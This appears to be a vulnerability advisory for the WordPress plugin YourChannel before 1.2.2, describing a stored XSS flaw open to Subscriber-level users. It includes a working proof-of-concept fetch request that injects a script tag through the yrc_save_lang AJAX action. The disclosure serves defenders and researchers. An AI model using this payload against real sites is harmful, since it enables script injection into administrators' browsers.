## WordPress Plugin Vulnerabilities

# YourChannel < 1.2.2 - Subscriber+ Stored XSS

### Description

The plugin does not sanitize and escape some parameters, which could allow users with a role as low as Subscriber to perform Cross-Site Scripting attacks.

### Proof of Concept

fetch('http://localhost:10008/wp-admin/admin-ajax.php', {
method: 'POST',
headers: new Headers({
'Content-Type': 'application/x-www-form-urlencoded',
}),
body: 'action=yrc\_save\_lang&yrc\_lang[Videos]="><script>alert(1)</script>'
}).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));
The script will be exploited on the YourChannel admin page.

### Affects Plugins
